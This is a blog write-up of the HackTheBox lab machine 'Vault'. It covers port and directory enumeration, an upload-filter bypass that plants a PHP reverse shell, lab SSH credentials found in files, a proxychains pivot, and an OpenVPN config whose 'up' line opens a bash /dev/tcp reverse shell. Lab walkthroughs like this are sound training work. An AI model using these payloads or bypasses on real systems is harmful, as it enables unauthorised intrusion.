---
layout: post
title: Hackthebox Vault Writeup
categories: HackTheBox
---

<img src="/public/images/2019-04-07/vault_badge.png"><br>
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.
This is a write-up of machine "Vault" on that website.

## Solution
### 1. Initial Enumeration
Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.109 -sV -sC 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-05 15:02 EET
Nmap scan report for 10.10.10.109
Host is up (0.036s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)
|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)
|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.36 seconds
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.109/ -x .php

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.109/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/03/05 15:06:18 Starting gobuster
=====================================================
/index.php (Status: 200)
/server-status (Status: 403)
=====================================================
2019/03/05 15:35:07 Finished
=====================================================
{% endhighlight %}

In index.php, there is a message "We are proud to announce our first client: Sparklays (Sparklays.com still under construction)".<br>
![placeholder](https://inar1.github.io/public/images/2019-04-07/2019-04-01-13-29-39.png)
Try to access to /sparklays.

Gobuster HTTP /sparklays:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.109/sparklays -x .php

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.109/sparklays/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/03/05 16:00:28 Starting gobuster
=====================================================
/login.php (Status: 200)
/admin.php (Status: 200)
/design (Status: 301)
=====================================================
2019/03/05 16:29:17 Finished
=====================================================
{% endhighlight %}

Gobuster HTTP /sparklays/design:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.109/sparklays/design -x .php,.html

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.109/sparklays/design/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Extensions   : php,html
[+] Timeout      : 10s
=====================================================
2019/03/06 14:13:00 Starting gobuster
=====================================================
/uploads (Status: 301)
/design.html (Status: 200)
=====================================================
2019/03/06 14:58:17 Finished
=====================================================
{% endhighlight %}

### 2. Getting User

In "/sparklays/design/design.html", we have a link to "/sparklays/design/changelogo.php".<br>
"changelogo.php" has a form which we can upload a file.
![placeholder](https://inar1.github.io/public/images/2019-04-07/2019-04-01-15-35-18.png)

If we upload a image file, we can find it in the directory "/sparklays/design/uploads/".<br>
This form has file upload restriction but by changing file extension to "php5" and Content-type, we can bypass the restriction.
![placeholder](https://inar1.github.io/public/images/2019-04-07/2019-04-01-15-59-40.png)

By accessing uploaded php code, we can achieve a reverse shell.
{% highlight shell %}
# Access http://10.10.10.109/sparklays/design/uploads/php-reverse-shell.php5
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.109] 37380
Linux ubuntu 4.13.0-45-generic #50~16.04.1-Ubuntu SMP Wed May 30 11:18:27 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 05:43:31 up  8:51,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
{% endhighlight %}

In "/home/dave/Desktop", we can find interesting files.
{% highlight shell %}
$ pwd
/home/dave/Desktop

$ ls -la
total 20
drwxr-xr-x  2 dave dave 4096 Sep  3  2018 .
drwxr-xr-x 18 dave dave 4096 Sep  3  2018 ..
-rw-rw-r--  1 alex alex   74 Jul 17  2018 Servers
-rw-rw-r--  1 alex alex   14 Jul 17  2018 key
-rw-rw-r--  1 alex alex   20 Jul 17  2018 ssh
{% endhighlight %}

In the contents of "/home/dave/Desktop/ssh", there is a ssh credential.<br>
{% highlight shell %}
dave:Dav3therav3123
{% endhighlight %}

We can have a ssh connection by taking advantage of that.
{% highlight shell%}
root@kali:~# ssh dave@10.10.10.109
dave@10.10.10.109's password: # Dav3therav3123

~~~

Last login: Sun Sep  2 07:17:32 2018 from 192.168.1.11
dave@ubuntu:~$ 
{% endhighlight %}

In the home directory, there is also an interesting file.
{% highlight shell %}
dave@ubuntu:~/Desktop$ cat Servers 
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x
{% endhighlight %}

We can execute nmap scanning for these servers by using <a href="https://github.com/rofl0r/proxychains-ng">Proxychains</a>.<br>
At first, add some settings in "/etc/proxychains.conf"
{% highlight shell %}
root@kali:~# tail /etc/proxychains.conf 
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
{% endhighlight %}

Then, create a ssh connection.
{% highlight shell %}
root@kali:~# ssh -D 9050 dave@10.10.10.109
{% endhighlight %}

Then, execute following command.<br>
We can figure out on 192.168.122.4, ssh and http is running.
{% highlight shell %}
root@kali:~# proxychains nmap 10.10.10.109
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-01 18:20 EEST
|S-chain|-<>-127.0.0.1:9050-<><>-10.10.10.109:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-10.10.10.109:22-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-10.10.10.109:139-<--timeout

~~~

|S-chain|-<>-127.0.0.1:9050-<><>-192.168.122.4:19350-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.122.4:9101-<--timeout
Nmap scan report for 192.168.122.4
Host is up (0.036s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 36.08 seconds
{% endhighlight %}

Then, seeing what is the content of http server.
{% highlight shell %}
root@kali:~# proxychains curl http://192.168.122.4/
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.122.4:80-<><>-OK
<h1> Welcome to the Sparklays DNS Server </h1>
<p>
<a href="dns-config.php">Click here to modify your DNS Settings</a><br>
<a href="vpnconfig.php">Click here to test your VPN Configuration</a>
{% endhighlight %}

We can try to open this website with browser(But generally don't run web browser with root !!)
{% highlight shell %}
root@kali:~# proxychains google-chrome --no-sandbox
{% endhighlight %}
![placeholder](https://inar1.github.io/public/images/2019-04-07/2019-04-01-19-27-37.png)

In "/vpnconfig.php", we can find a form which we can edit / execute .ovpn file.
![placeholder](https://inar1.github.io/public/images/2019-04-07/2019-04-01-19-25-19.png)

After running netcat, by posting following data with "vpnconfig.php", we can achieve a reverse shell from VM "DNS"
{% highlight shell %}
remote 192.168.122.1
dev tun
nobind
script-security 2
up "/bin/bash -c 'bash -i >& /dev/tcp/192.168.122.1/4444 0>&1'"
{% endhighlight %}

{% highlight shell %}
dave@ubuntu:~$ nc -nlvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [192.168.122.4] port 4444 [tcp/*] accepted (family 2, sport 35236)
bash: cannot set terminal process group (1123): Inappropriate ioctl for device
bash: no job control in this shell
root@DNS:/var/www/html#
{% endhighlight %}

user.txt is in directory "/home/dave":
{% highlight shell %}
root@DNS:/home/dave# cat user.txt
cat user.txt
a4947faa8d4e1f80771d34234bd88c73
{% endhighlight %}

### 3. Getting Root

In directory "/home/dave" on DNS, we can find an interesting file.
{% highlight shell %}
root@DNS:/home/dave# cat ssh
cat ssh
dave
dav3gerous567
{% endhighlight %}

By following command, we can figure out that we can execute any command as root.
{% highlight shell %}
dave@DNS:/home$ sudo -l
[sudo] password for dave: 
Matching Defaults entries for dave on DNS:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dave may run the following commands on DNS:
    (ALL : ALL) ALL
{% endhighlight %}
